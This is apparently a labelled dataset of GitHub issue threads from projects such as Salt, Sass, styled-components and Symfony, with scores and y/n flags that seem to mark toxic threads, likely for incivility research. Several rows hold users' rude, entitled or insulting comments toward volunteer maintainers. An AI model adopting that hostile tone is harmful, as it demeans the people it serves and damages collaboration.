/usr/bin/salt-master -l trace root     16571  0.0  1.5 174500 15660 pts/1    Sl   1419   000 python /usr/bin/salt-master -l trace root     16578  0.0  1.5 191024 15896 pts/1    S    1419   000 python /usr/bin/salt-master -l trace   So far, I've managed to get to line 130 ""self._popen = Popen(self)"" of process.py before I see the error. I have no idea what I'm doing here, I'm just able to see it getting that far and that being the line where things go boom.  This does make it look like a zmq context is being passed into a new process, I am going to hop into IRC ",19,0,578,0,0,215,25,n,
salt/saltstack/49765,0.05440006,saltstack,salt,Snotty people on #salt IRC channel,3328,52,28,0,0,"Description of Issue/Question Don't understand the attitudes of the people on IRC Setup I am deploying windows machines. The deployment system auto installs salt with the correct salt ID's (that's pretty neat but I won't go into details). The salt ID's are partially based on a date stamp and remain permanent for the life of the PC. They are effectively the true names of the PC's. The deployed machines are not set up to automatically domain join. Partly because the Windows computer names names are somewhat in flux. Partly because my boss and co-workers don't want our credentials stored anywhere To domain join I create an sls file which can be invoke by the sysamin. The runner will ask for a user name and password and pass that as pillar data. The intended computer names come out of an external pillar (stored in a postgresql db). The runner then just applies the state and the PC's join with their intended names. I've been testing this today and it's working well, but people on the #salt irc channel were giving me flak and insinuating that I'm an idiot. BTW i don't care if i am an idiot. I just want to know why anything I'm doing is worse than anything anyone else does. I have asked #windows people ""how do you join 100 machines?"". This is the conversation So there you have it, the typical process involves someone ineracting with 100 machines. I avoid all that. Why am I being criticised?  Hi @friend. I lead the core maintainers team at Salt. I'm sorry you felt criticized. In the morning, I'll ask somebody on @friend/team-windows to try to help you with your question specifically. I do want to respond, however, to your comment about the ""vision of management"" of Salt to ""extend in every direction"". As the principal maintainer of this project, my view is one of great pride that people in our community are trying to offer what they may see as the best solution for a problem, regardless of whether or not that answer involves Salt. While I hope that we can always continue to grow the project to cover more ground, If another solution for a given problem is better than ours, I hope our community continues to have the integrity to heartily recommend it over Salt in the interest of being as helpful as possible instead of merely dogmatic. That said, I hope you'll keep using Salt and, as I said, I'll make sure the Windows folks get in touch with you in the morning to see if there's a way that Salt can be made to work in a way that solves the problem you're concerned with. Best, -Mike  @friend I don't need any help specifically. All of the specific technical problems I was having are resolved. My first question was ""how could this be done better without salt"", since people were implying that it could. I couldn't think of any solution that would be substantially simpler in terms of number of operations. I'll forget about the scond point I was making for the time being.  I assume above is the main point of this issue. There is a slack channel for windows help. Slack keeps a few days worth of history, so if people are not constructive in their comments  its more noticeable. (Invite sent to you email address)  I'm sorry about this. Anyway I've come up with a much better system thanks to some of the help I got on slack. Thanks to all the people who have helped me with suggestions so far. ",14,1,100,0,0,85,2,n,
sass/sass/2507,0.23283252,sass,sass,Regarding issue #132,661,5,6,0,0,"Regarding issue #132 Every language has string interpolation. Add the feature, stop being stubborn. Also in my opinion those who work for 30 years plus get stuck in their own (old) ways and don't like change. @friend . By expressing string interpolation is a bad idea, is just saying all other languages who have implemented it are wrong to do so. Also, closing/disabling comments is a bad form of censorship which goes agains Open-Source ideals. Please reconsider! and change old habits, they are toxic.  Name-calling is not acceptable behavior, nor is attempting to re-open a locked issue. Don't do it again or you will be blocked from the Sass organization. ",1,0,25,1,0,12,1,y,
screenshots/mozilla-services/4211,0.15709078,mozilla-services,screenshots,Datestamp in titles results in duplicate titles if taken on the same day,4714,59,32,0.8,0,"From discourse  This was reported as producing the same name, but testing shows the filenames have a number in them, eg  file.png -&gt; file(1).png -&gt; file(2).png, etc.  I think it's put there by the browser?  So...we're going to close this.  I'm on the latest Firefox 59.0.2, GNOME 3, and I'm experiencing the duplicate filenames issue. Steps to reproduce  Visit a website (e.g. this page on github). Take a screenshot of the visible part of the page. The save dialog appears with the Downloads directory open in it. Change the directory e.g. to Pictures. Save the screenshot. Take another screenshot of the visible part of the same page. The save dialog appears, and it shows the Downloads directory again. As there is no file with this name in this directory, ""(1)"" is not appended. Change directory to Pictures. Try to save the screenshot, and the save dialog warns you that you are trying to overwrite the existing file.  Expected result No filename collision between the screenshots taken at different times. Actual result Screenshots taken at different times have the same filename, and the user is forced to manually rename the file. Additional comments ""(1)"", ""(2)"", etc. are really appended to the filename if you don't change the directory in the save dialog and just save everything to Downloads. But if you want to store the screenshots to a different directory, you are forced to select it manually each time which is annoying, and no ""(1)"", ""(2)"", etc. are appended in this case. The best solution in my opinion is to just include a timestamp (including seconds) in the filename.  @friend Thanks for the feedback. This bug has been closed as a wontfix, sorry. FWIW, on linux, you should be able to use something like  to auto-detect filesystem changes, and automatically rename any files matching the Screenshots initial part to include a local timestamp. I realize this isn't the answer you're after, but at least you can easily hack together a DIY solution plus one  ORLY? I can't see any mention of this resolution ITT. What I see is the following which means that the bug is closed as invalid/not reproduced. I suggest the steps to reproduce the bug so that you all could see that it's valid. So why not just follow the steps, reproduce the bug and reopen it, then fix it? It's trivial to fix that little tiny thing that irritates and annoys a lot of users, but instead you suggest some ugly workarounds when it's Firefox Screenshots' job to name the files correctly. Instead of creating the file with the correct name, you suggest creating a file with a wrong name, running a daemon that runs inotify watches and renames them. And I strongly believe that you understand the consequences of that ""solution"" ‚Äî it's easy enough to get into an inconsistent state, be it a power loss before renaming, or a daemon crash, etc. There is a kind of people who write low-quality bash scripts for everything with hardcoded , race conditions, improper escaping, etc. I'm not one of those people, and I'm not gonna turn my computer into a dump by writing buggy scripts when someone refuses to fix their buggy software. It's too sad to admit that the new Firefox has taken a self-destructive course. Firefox Screenshots demonstrate that perfectly. First half of the extensions is broken including the extension I used to take screenshots. Then Mozilla introduces a built-in screenshotting tool which is, by the way, inferior to the one I used before. And what we see here? A big blue Save button that sends my private data to the cloud instead of saving my screenshots (#3603). Ugly error messages when just following a normal user flow (#3964). Too many clicks to just save a screenshot ‚Äî it takes me at least 5 clicks just to save a shot of a page when it had taken me only a single click when I used a third-party screenshotter extension. One screenshot a day limit (#4229, #4211). No way to customize the filename pattern (#4229). Doesn't remember the directory where I store all my screenshots (#4211). These all make this piece of software absolutely unusable. These are the real problems, because they break UX. However, from version to version, nothing changes in Firefox Screenshots, still the same problems, still unusable. And the developers just say they are not going to fix that. Firefox Screenshots' fate is sealed. Just like Firefox Hello, it started as a new good useful tool, but it will end up exactly the same way, because it doesn't seem to be developed any more. I beg my pardon for possibly rude voice, but I'm seriously concerned about my favorite browser's future, and such responses from the developers are no good sign.  Let's take a minute to chill. Locking this issue for now. ",5,5,192,0,0,103,4,y,
sentry-elixir/getsentry/282,0.11597502,getsentry,sentry-elixir,Document full dependencies ,1611,16,5,0.666666667,2,"By specifying the below you are saying that for all combinations of software on which Elixir runs, your software runs. However, we already know that this isn't the case, because of existing (unresolved) bug reports related to parallel compilation; bugs your team has not addressed in an efficient or effective manner, I should add. So, before I will actually try to debug anything, I would like to hear from you -- the vendor -- what the dependencies actually are to make this work on generic Linux. Preferably I would like to see this fully automated in a script of some kind named . This script would check for the operating system, libraries on which it depends (which you have done partially, I believe already), OTP versions, etc. The script should output either an exit status of 0 signifying that a subsequent compile is guaranteed to work or an exit status of 1 when the system configuration is not OK with a list of errors of what's wrong.  In the future please link to the issues and errors that you are having. I understand you are having trouble and this is a very annoying bug. You must understand how hard it is to fix an issue when its not easy to reproduce your self. The issue as presented is not a productive way to interact with any human being. It turns out that this is a bug in the Elixir Compiler and is being fixed for elixir 1.7.  issue is with how deps are being reported to sentry, the only fix at the moment would remove dep's from being reported at all until mix is fixed. We're discussing possible options and should have a fix out soonish.  This should temporarily fix the issue. ",10,0,39,0.333333333,0,27,0,y,
silverstripe-framework/silverstripe/7761,0.077779521,silverstripe,silverstripe-framework,Unorthogonal interface TextField Vs. HiddenField,3931,38,45,1,3,"SS4.0 TextFieldcreate(&lt;name&gt;, &lt;value&gt;) OK HiddenFieldcreate(&lt;name&gt;, &lt;value&gt;) NOT OK. HiddenFieldcreate(&lt;name&gt;)-&gt;setValue(&lt;value&gt;) There is not reason to trip up new developers like this  @friend Can you provide more info on what specifically you expect to happen vs what‚Äôs actually happening? The second argument should be the title (that is, the ‚Äúlabel‚Äù used when the field is displayed) - the third argument is for value - is that what‚Äôs causing your issue? It is a little strange to push a title to a  when that title will never be displayed, but it keeps that API (slightly) more consistent with other form field types )  Your examples are wrong.  objects are ‚ô†FormFieldcreate(&lt;name&gt;, &lt;label&gt;, &lt;value&gt;)` see  No.  FormField from  that pattern for a hiddeen field does not work in the template as Results in  @friend that all looks as expected... if you add and you'll get output  The bug is that the interface for a text field and a hidden field are different.  IMO They should be the same.  can you explain in what way they are different, please?  TextFieldcreate(&lt;name&gt;, &lt;value&gt;); // OK HiddenFieldcreate(&lt;name&gt;, &lt;value&gt;); // NOT OK.  @friend - I'm sorry, you're not being clear. both of those work, don't result in error, output expected HTML/fields. Form what I can tell you actually are asking for these APIs to be different, not the same... You'd like 's second constructor argument to be the value and not the label, is that right?  They produce different output. See above where I created an example and cut and pasted resulting HTML.  That is expected, the two examples you're giving are fundamentally different In the above code,  has no value set and just a name and label,  has a name and no label and a value is set. Therefore you'd expect different output and the output you've shown looks expected.  has no value and  does.  No. produces produces Those are different.  The second argument to the FormField is the value not a label according to the API documentation.  As I read it  Worik, sorry mate... I think you're confusing Title (ie. html ) and Value (ie. html attribute ). This is true for virtually every form field. Perhaps if you can provide a link to the documentation you're reading specifically, and what it is that has you turned around from it? ie. suggestions on how it could be clearer? Maybe the wording is a bit confusing.  I am showing you code I have been implementing. On close examinatuion the second argument for TextField constructor chould be 'Title' BUT, having missed that, I passed a value as the second argument to create(..) and hey presto it is the value.  Doing exactly the same pattern for HiddenField resulte in a different output. That is a bug.  I have reproduced it Ad nauseam Perhaps the TextFiled interface is buggy, I do not know,. it is the way it is used in the lessons, perhaps they are buggy too.  I do not know. But I do know this The interfaces to the HiddenField and TextField's create method are different when they should be the same. I have made that clear in examples above.  It is bnot a hypothesis but an observation. It may not seem like a bug to have idiosyncratic interfaces, but it makes life very difficult for new comers to the platform  Test 1 Creates Test 2 Creates  @friend Is this SilverStripe 4.0? Lets step through it together ) public function __construct($name, $title = null, $value = '', $maxLength = null, $form = null)FormFieldHiddenField`. You can see this here  Whatever.  That is all nice theory.  But the facts, here are that the interfaces differ.  SS4.0  I'm going to lock this topic, since it looks as if the original question has been answered adequately and the discussion seems to be degrading. Please keep in mind the SilverStripe code of conduct when contributing and responding to bug reports. Thanks =)  @friend how about we catch up  on slack ) ",13,0,221,0,0,139,7,y,
spring-cloud-sleuth/spring-cloud/991,0.159276303,spring-cloud,spring-cloud-sleuth,"trace mysql use ""brave-instrumentation-mysql"" is not using ",3300,13,147,0.333333333,3,"&lt;dependencyManagement&gt;         &lt;dependencies&gt;             &lt;dependency&gt;                 &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;                 &lt;artifactId&gt;spring-cloud-sleuth&lt;/artifactId&gt;                 &lt;version&gt;2.0.0.RC1&lt;/version&gt;                 &lt;type&gt;pom&lt;/type&gt;                 &lt;scope&gt;import&lt;/scope&gt;             &lt;/dependency&gt;         &lt;/dependencies&gt;     &lt;/dependencyManagement&gt;     &lt;dependencies&gt;         &lt;dependency&gt;             &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;             &lt;artifactId&gt;spring-cloud-starter-sleuth&lt;/artifactId&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;             &lt;artifactId&gt;spring-cloud-sleuth-zipkin&lt;/artifactId&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;io.zipkin.brave&lt;/groupId&gt;             &lt;artifactId&gt;brave-instrumentation-mysql&lt;/artifactId&gt;             &lt;version&gt;4.13.1&lt;/version&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;mysql&lt;/groupId&gt;             &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;io.zipkin.brave&lt;/groupId&gt;             &lt;artifactId&gt;brave-mysql&lt;/artifactId&gt;             &lt;version&gt;4.0.6&lt;/version&gt;         &lt;/dependency&gt; &lt;/dependencies&gt;   if you want us to help you have to stop re-opening issues and use gitter instead ok?   issues can cause some annoyance. you were asked to not open an issue and did it again. Moreover you opened an issue after already creating this one.. please don't behave like this as we want to help but it is hard when annoyed ok?  This problem has not been dealt with completely, you close, this behavior is too responsible, the first use of this, can not be more patient?  I'm trying to make my point. How do you feel so impatient  Your attitude of forcing closure without solving the problem is really disappointing  We've asked you to use gitter. that's how we support things. This needs to be investigated as a problem before using an issue. As mentioned in the issue template, issues are used for changes to the codebase. I don't think a change will occur here in this repository. Please don't make us block you.  I also asked you multiple times to provide your full codebase and instructions on how to replicate the issue. Also, I've asked you if you followed the guidelines in the brave-mysql instrumentation repo. You have provided no feedback and kept ignoring my questions.  I didn't even come and provide the full code, so you shut down the problem  you posted the issue twice.. here after posting here less than a day ago  are you not joining gitter like asked? do you feel that doing the opposite will make things better for either you or us, or the hundred people who are alerted when you post issues like this? The request on the issue is to please try the example, and if report back on gitter what happens. please do that and stop pasting things at us. it is easier and we can be friends as opposed to being frustrated ok? ",5,0,307,0.333333333,0.333333333,44,6,y,
styled-components/styled-components/1721,0.227197108,styled-components,styled-components,How to use themeprovider without wrapping entire app?,2701,34,22,0.666666667,0,"@friend I am really don't know who is best person to address this question, I found greelen name first in the list so addressing you. I am creating component library for client which I am using as npm link to use it in create react app. But the question is component library project has no App container so I can not wrap it as  ‚ô†&lt;ThemeProvider&gt; &lt;App /&gt; &lt;/ThemeProvider&gt;` So what is the alternate way I can use themeprovider? How can I use as importing to each component and use theme props? Please help.  What component library tool are you using to develop? (storybook, styleguidist) They usually offer a way to have wrapper components. Let me know, and I can help you out.  Do I really need need storybook or styleguidist? Without container shouldn't I use theme provider? For now I have ex. colors.js where all colors are defined and I am importing that colors in every component. Is there any advantage using theme provider instead of this approach? And if yes then let me know how can I leverage theme provider without introducing any other third party library?  You don't technically need to use  to use styled-components.  I think you don't understand what I meant. I said I want to apply theme to my styled component. Ex. Here is the code my styledLabel component import styled from 'styled-components'; import  as fonts from '../styles/fonts'; import  as colors from '../styles/colors'; ; module.exports = {   sidebar '#1D242D',   primary1 '#696D73',   primary2 '#535354',   primary3 '#929497',   canvas '#FFFFFF',   highlight '#4F80FF',   accent1 '#DBDCDF',   accent2 '#CCCCCC',   alarm '#EE4623',   background '#EDEEF1' }; ‚ô† Here if you can notice I have given color from color.js. @friend @friend is the same as wrapping component in ?  @friend I don't think I understand your use case, unfortunately. That being said, if you aren't able to reliably wrap your entire app with a , you can alternatively wrap your individual components with it in the implementation. ; export default function ThemedButton(props) {   return (     &lt;ThemeProvider theme={theme}&gt;       &lt;Button {...props} /&gt;     &lt;/ThemeProvider&gt;   ); } ‚ô† For example.  @friend can you please read entire thread first because your answers are irrelevant? @friend  If no body can answer from styled components team then please close this issue, because I am not getting proper answer.  I did read it and I said in my response I don‚Äôt understand your use case but am trying to help anyway.  In case you didn‚Äôt know, we are all volunteers working on this project. Your attitude and sense of entitlement for a perfect solution to your mostly unelucidated use case is both rude and condescending. ",10,0,161,0,0.333333333,90,9,y,
styled-components/styled-components/2426,0.15005921,styled-components,styled-components,Cannot edit whatever .oxevfn is,988,11,6,0,0,"Can we hold Google chrome responsible for .iwuvb not being editable in a browser. I think the deliberate obfuscation built by Styled-Components in 100% negligent and generally affects my workflow negatively slowing it down 600%, but the fact that I cannot even manipulate the thing without rewriting it is complete BS. I cannot wait for this terrible of CSS-in-JS shim to be native and integrated with browser dev tools. In the meantime UI will move an a snails pace until Javascript Engineers and Browsers Engineers can all agree there is a visual element to UI and being able to see what I'm doing becomes again an element to the workflow of UI development. Being able to understand where .iubcx came from without the hacky babel plugin that's not even that helpful will be a step in the right direction. Why is using unique class names not used for building unique components who already have unique names? It's beyond me -- it seems like a personal attack on UI Engineers everywhere. ",6,0,20,1,0,32,1,y,
stylus/openstyles/498,0.206852019,openstyles,stylus,When Stylus is disabled it continues to inject a style element,1952,18,18,0.666666667,0," Browser Firefox 62 Operating System Windows 10  Noticed as a result of #461 and #497 - even when Stylus is disabled with the ""Turn all styles off"" option, it continues to inject a  element. It only stops injecting the style element when the configured styles that are applicable to the current page, are all individually disabled.  This is how Stylus (and its ancestor Stylish-for-Chrome) always worked so it's not related to the mentioned issues. I guess the reason is that the purpose of ""turn all styles off"" option is to toggle all styles quickly in case of problems or when writing styles.  Didn't say it was. Only said it was how I happened to notice it. I'd say the fact that Stylus currently breaks sites that try to read  in Firefox, as per above issues, is a pretty big problem. In the more broader sense if I tell an extension to temporarily ""hands off!"" and disable itself for a page; I expect it to ACTUALLY leave the page alone. Which Stylus doesn't do with the big panic button, that is specifically meant for these use-cases. It instead requires disabling each individual applied style... The fact that this is how Stylus 'alway worked' doesn't mean it is correct.  You can simply disable the extension itself.  Doesn't change the fact that Stylus's behavior is non-orthogonal and stupid. It keeps the style element around (but empties it) when you check the ""turn all styles off"" option. But it removes the element if you remove all checkmarks from all individual styles that were active. Fine if you don't want to fix it, just don't make up bull excuses for the differing behavior, like performance impact. The actual cost of CSS updates is in parsing the CSS text; updating internal stylesheet data structures; re-matching selectors to the website HTML; re-applying layout; re-applying painting; and finally re-applying compositing. Recreating the style element is negligible to the extreme.  There's no need to change the behavior ",2,4,69,0.166666667,0.166666667,55,1,y,
symfony/symfony/17749,0.052129227,symfony,symfony,[RFC] Move tests out of the source and source out of the tests,12251,117,78,0,8,"The Source  Often when I'm auto-completing classes in my IDE, I get the suggestion to use the *Test file. Project wide searches and Usage Finder always shows tests using the search key or method/class etc. KernelTestCase and WebTestCase are library dependencies in a test directory  I'm working on adding some functional tests to a bundle and this gave me a problem. I had to depend on the FrameworkBundle 2.3 for BC reasons but I couldn't depend on 2.3 because that one didn't have the KernelTestCase yet so I needed 2.5. The Symptoms For applications the recommended location is in /tests/. For Application bundles this seem to be /Tests/ and the same goes for re-usable bundles. The current setup with the recommendations and implementations cause a few issues  I need to load files from the vendor Tests in order to run my tests. I get vendor test files which I can autoload and depend on. 2 different recommendations for test locations. I cannot easily exclude them from the distributed version.  The Solution Personally I always put my code in bundles in the /src/ directory, this gives me a clean root directory and my tests in /test/. This leaves the root directory for all the meta-information for your package (example). So my suggestion is  Extract the  and  to another component (PhpunitBridge?) where they can reside in the source instead of test location. Exclude the tests from the archive. Not put the source in the package root but in /src/ like suggested for applications. Put tests in /test/ or /tests/ where they have an autoload-dev so they cannot be loaded in production code.  This will create a clearer structure where your source is not polluted by the tests and you cannot put anything of your public api in your tests (like the TestCases). When the test-cases are moved out, I can also require 2.3 or higher instead of 2.5 and higher (thus 2.7).  This topic has been discussed some time ago, the major problem with this idea is the subtree split of each component.  @friend Yeah I got informed about that. I've updated the issue.  We used to have tests outside of the src directory (see  usually put test cases outside of the tests namespace already, so they're not part of the  namespace. Both WebTestCase and KernelTestCase are already in the  namespace (the first one was moved recently).  To me there is a difference between tests  (internal, should not be extended in other packages) and test helpers  (traits/test-cases). When you ""need"" (there is no other way) to extend a test helper that is in  it should be moved to  so you can use it. I actually have that problem with some Doctrine tests,   I solved using  there is a risk of breakage here as I'm using classes that are not part of the public API and therefor have no BC policy. Mark tests directories as excluded plus one going to that now as I to have fallen trap to this...  @friend, that's 68 (symfony 49) directories in total which I'd rather not even have on my filesystem to begin with. I only need them when I explicitly install that repository and I have to run them. Given I'd exclude Tests via a regex, the kernel/web tests are excluded too. The solution is valid but won't work if you have 20 applications and dozens of bundles which all use symfony.  This was also done with gitattributes and reverted in #6605 I still think this should be reintroduced as I said in   Tests are documentation and should remain next to their src. For production releases, I assume everyone has their own prefered deploy mechanisms removing files not needed for such an env can easily be accomplished during your preferred deploy operation. I too use PHPStorm I don't understand the difficulty of setting the tests directory to ignored within the IDE if such is desired.   @friend Because if you use symfony/symfony and have 20+ applications doing this, you'll spend too much time ignoring them, where as excluding tests from the packaged version is something you do with your own package, not that of others.  An other option  I also just sent this message to github support Is there a way to get a ZIP that includes ALL files (i.e. that is built without taking .gitattributes into account?) That would be really great because that would allow us to have packages for our project one for humans (with the full source) and one for robots/ci-scripts (the current one). If anyone has the answer (or could push for making this happen), help welcomed )  An other option would be to add a feature to composer to clean paths specified in the  option in composer.json files.  One more reasons to exclude tests Composer beta  Here is my reasoning pro keeping tests where they are and also in the .zip archives  Some of us want the tests out, either because e.g ""they pollute their autocompleter, or their code searches or just their filesystem"". Some of us want the tests in, because e.g. ""having them always at hand enables this coding workflow of looking at tests to know how the code behaves and how it should be used"". You can grow the list of pro and contra arguments, the truth is that everyone is right this is a matter of personal preference. In this situation, we, as the Symfony project, can have two attitudes we can forcibly decide for others, or we can empower people in allowing both way of things. Given the history of this very topic, and the presented arguments at both sides, I'm now convinced that we should not enforce what would be otherwise a subjective and controversial ""best way"". So the question for me is now which choice allows both practices to coexist? The first aspect is the if we always ship the tests as we do today, 2. is allowed, and 1. is just one IDE configuration or cleaning script away. Moving tests out of each components folder breaks 2. for subtree splits. Looks like a no-go. Now moving tests out of archives since we install code through composer, we could use --prefer-dist for 1. and --prefer-source for 2. But this ignores one practical and fundamental difference --prefer-source is slow as hell. --prefer-dist has one ZIP to download, and then has local caching, which means it's fast, very fast. --prefer-source has to  and isn't cached as of now. Nobody can't possibly accept to loose so many time because ""hey, 2. is your choice, haha"". So, my point is that in practice, this has the same effect as not shipping the tests at all. No-go again.  In conclusion I'm all for the status quo, which is the best solution, unless --prefer-source can be made as fast as --prefer-dist (or any other way that would make fetching the tests as fast, see e.g. my email to github support). Meanwhile, I'm all for enhancing editorconfig or any other way to help 1. supporters configure their IDE or clean their filesystem.  How many people actually spend time diving into tests and trying to understand them (which is usually more complicated than looking at the code)? If people really want to see the tests while they are developing they can choose already . If this is too slow for them, they can also view the files on github. By packaging the tests, people who don't use them or don't need them (My guess is 90%+) still get them. This is extra bandwidth, extra actions during deployment and extra effort in the IDE. If people really, really want to run the tests, they should make a clone (or grab the zip from github) and run it in there with their  dependencies. When the package comes from Packagist it should not include test files for the simple reason that most people won't even need them and should follow one of the above steps for a better workflow in the first place. In my eyes this would mean  Leaving the repository as is for github Adding composer excludes for packaging   @friend no, it's not a matter of personal preference. There are situations where you can do everything, but it's better to do only one thing (like putting your sources outside the  folder). There are two environments with different needs, dev &amp; prod, but we have to face the problems in the order of priority, so let's discuss prod before dev. In production we have two topics security and performance. NOT having additional files will always improve both. Security the only code that can't be broken, or can't broke something else, is the one that there isn't. Performance less code, less resources, less timings. The  already present it's good, but not enough. I am sad that you closed your  about  I highly hope that to be merged. Once the production is faced, only then we can discuss about development, and whether or not including additional informations (like tests) in a dev setup.  @friend any consideration about my previous thought and reopening  No way for me I won't take the lead on this topic...  What about this solution for the problem?  Just out of interest, why does symfony recommend that the tests are in the root of a project but do not do this in symfony/symfony? I understand that there would be issues with the subtree split, but i‚Äôm sure something could be worked out? I‚Äôm not trying to force a change here but just understand the reasoning so I can work out my own best practice. Having the tests together in root seems like a logical and friendly solution. However symfony moved them out, does this mean the more complex projects get I would probably need to move them out too?  @friend because we want to include tests in our subtree split repositories, and for that, they need to be in the split folder.  @friend yes, as I say, I understand about that. However, as far as i recall this is some automated process (i think with split.sh) so there is probably a way around this to make it work. It just seems very strange to say ""We recommend you do it like this, but we do it differently"". If symfony/symfony immediately hit an unsolveable problem with this structure, perhaps there is something inherently wrong?  @friend if you read official Symfony best practices, you may notice that there are different for non-reusable apps (ie your private project) than for shared packages/bundles. The recos that applies to apps are made to prevent doing things that bundle require, but are just overengineering to private apps. The same apply here. symfony/symfony is structured to reach its goals, which is not the goal of your private apps.  @friend can we close this one? From the symfony project pov, this is solved to me, it's an argumented ""no"". I understand you don't agree, but that's still ""resolved"".  @friend thanks, yes I understand that. Lots of private apps sometimes end up public / reusable tho. If this structure locks you in, or may create problems down the line, then it might not be advisable as a general standard. If there is a workaround to deal with it, mayne it would be good to standardise symfony/symfony too? Please dont think i am trolling you or trying to cause an problem here üòÑ. That is really not my intention and I am very grateful for all the hard work and though you guys put in üëç. I am just attempting to gain understanding and maybe offer perspective. Perhaps the solution is a mutually agreeable one? Perhaps there is a solution but ""it just isn't worth it"". Resistance to change without consideration can lead to unfortunate situations in the future. Perhaps this issue is just not high prio or maybe the discussion should be taken elsewhere?  symfony/symfony is a meta project the project levels are the subtree splits. At the project level, tests are at the root. That's what @friend mentioned also.  I think this issue of symfony/symfony root vs package root will become a lot less once flex is released.  @friend that makes it clearer to see it as a ""meta"" project. A bit strange that work is done on the meta project but i guess that is thats a side affect of the monolithic project approach. Definitely makes sense in this case tho, so thank you. @friend could you point me in the right direction for info on flex?  @friend there's no public info on ""Symfony Flex"" project yet. It will be released ""soon"" and it will be a new way to install/manage Symfony applications in a ""composable"" way.  @friend This was only announced during the SymfonyCon keynote for now, and the video is not yet available AFAIK.  Great, I will keep a look out for it. Thanks for the info everyone üëç ",62,4,409,0,0,231,14,n,
symfony/symfony/27936,0.094214103,symfony,symfony,RFC: change deprecation error handler to use weak_vendors mode by default,5237,49,43,0,4,"This RFC was prompted by the recent deprecations in various Doctrine projects, which now make some peoples' tests fail (example  For a Symfony project, the default value for the deprecation handler should be , not  - any deprecations within vendors are not within the scope of the application and thus shouldn't make tests fail. With Symfony Standard Edition being deprecated and Symfony Flex being the new Gold Standard (‚Ñ¢Ô∏è) I wasn't sure where to bring this up, so I thought I'd just ask around here. Would you be in favor for a change like that, and where would we make it?  I've always been quite skeptical with weak_vendor mode. My reasoning is that you call the vendor code, so in the end there is no such thing as vendor-only deprecations. The example here is a good one thanks to the default mode, we identified quite early that Doctrine was in ""WIP"" state. Without this early notice, it could have been left unidentified for much longer, thus fixed much later. I think the current default encourages a constructive open-source attitude instead of having a ""not my fault"" attitude, it encourages ppl to own their vendor. That also works on Symfony since we decided to build on top of Doctrine, we own a responsibility here also and keeping eyes actively open on the project is vital for the ecosystem.  Can you please explain what exactly was WIP there? Two new silent () deprecations appeared in dev version, for two classes deprecated ~6 years ago, and some more using phpDoc annotation . Although I agree that in the ideal situation the usage of deprecated classes shouldn't have existed by the time, I disagree with your actions regarding #27609 (the revert + discussion) where you discarded the work solely because of not-yet-migrated usage coming from a yet another development version. Yes. And everything would work as before. It's not a bug, using deprecated API doesn't inherently break anything and the deprecated API stays in place until end of minor version (semver-compatible approach). This is not relevant to whether  is / should be default or not, you can opt in for such behavior regardless. The deprecations using  are called opt-in, but with your assumptions, you are actually making opt-in deprecations opt-out. Sadly this completely breaks the original concept of _opt-in_ness - these deprecations are no longer opt-in since you force everyone to opt-in and comply. In the end what you are saying is in contradiction with Symfony's converntions I agree it's everyone's responsibility to keep an eye on the vital state of their dependencies. I agree it's a common interest to forward any breakages / incompatibilities / bugs to the maintainers of the dependencies in question as soon as discovered. I do not agree that silent/phpDoc deprecations should be something covered by any of these. Which brings me back to ‚ô†@friend_vendors`, there is still a notice for deprecations happening in vendors.)  @friend usage of the listener reporting deprecation and making tests fail for them is the opting in. This listener is optional, and deprecations are not making the testsuite fail if you don't have it.  Is it really though? Only having the package installed seems it gets enabled automagically in the report everything mode  installed it in a project without previously having the bridge (try yourself on doctrine/orm2.6 for example), didn't change phpunit.xml at all, but  suddenly ends with exit code 1 and summary of deprecations. ‚ô†composer create-project symfony/website-skeletonsymfony/phpunit-bridge` automatically. This is not opt-in.  This should be considered on the recipe for the bridge I suppose.  There should absolutely be no such thing, but unfortunately, it turns out people make mistake, and both the caller and the callee (which triggers) will be in the same Composer package.  was made to help libraries avoid that kind of mistake, which results in ""unfixable deprecations"".  As I understand, the only way to silence these errors is to use an environment var , but I have opened as issue as this still doesn't silence them as it appears that during simple phpunit bootstrap, getenv is not able to access the  vars -  I was not sure what  meant, but now that I checked the code and chatted a but with @friend, I pretty confident we should not do this  ignores any deprecations thrown by any vendor; it keeps only deprecations thrown by your own . That's not something apps should do. For libs, it may make sense of course. For this reason, I'd be -1.  After a constructive discussion on Slack with @friend, I updated my understanding of the topic. What want here is that their CI don't fail on deprecations. While this lowers the urge to contribute fixes to vendors that trigger their deprecations, this may be more compatible with daily job tasks. So here we are  doesn't use  because this mode is meant for libs. Instead it uses a maximum number of deprecations. But the end result is similar the CI won't fail by default, but the deprecation summary will still be printed.  I believe the solution implemented now is a good compromise. People can still complain about the deprecations or (ideally) fix them upstream without the deprecations disrupting their daily workflow. Thanks @friend! ",23,7,165,0,0,92,4,n,
symfony/symfony/3150,0.082463912,symfony,symfony,[Templating] - Unable to find template,11091,105,72,0,3,"Unable to find template ""global_right.html"" expected to work, but fails     {% include 'global_right.html' %}    expected to work, but fails     {% include 'global_right.html' %}    this works finally     {% include 'global_right.html.twig' %}    - I assume that this is because of how Symfony2 integrates twig, because twig documentations documents an expeted behaviour  should not enforce the .twig extension - or at least, the error messages should be more concise.  This is because Sf2 supports multiple engines (and this is not related to Twig itself) The templating engine to use is selected by the last part i.e.  @friend the include tag expect a template name. When using Twig standalone, the template name is generally directly the file name (and so can be virtually anything). The loader used in Symfony2 enforces a specific format to integrate templating with the bundle structure  @friend ""The loader used in Symfony2 enforces...""  That's the point. It should not force me to avoid the most natural thing within development inclusions. And if it does so, then it must bring up more concise error messages. It says ""Unable to find template""  which is missleading (if not wrong, the template is there). It should say ""File not allowed, twig is configured to load only ... ...! Try this and that, or change configuration in ... ""  Can I change the configuration somewhere, thus I can include a simple ""MyTrivial.html"", too?  @friend the issue is where would a template named MyTrivial.html be found ? And the error Unable to find template comes from Twig. And it is right. The template with this name does not exist. And the name of the template is not the same thing that the name of the file in which you store it (it does not even need to be stored in a file. You could write a Twig loader loading templates from a database)  Ok, I'm new to Symfony2. But I'm a 20+ years developer with experience in hardware-design, and thus not new to complex system / framework design. You are familiar with Symfony2, and that's exactly the reason why you don't see the obvious flaws in it. ""include"" is a known construct, with known functionality and behavior  (see e.g. apache SSI, or xiinclude for the web-domain). 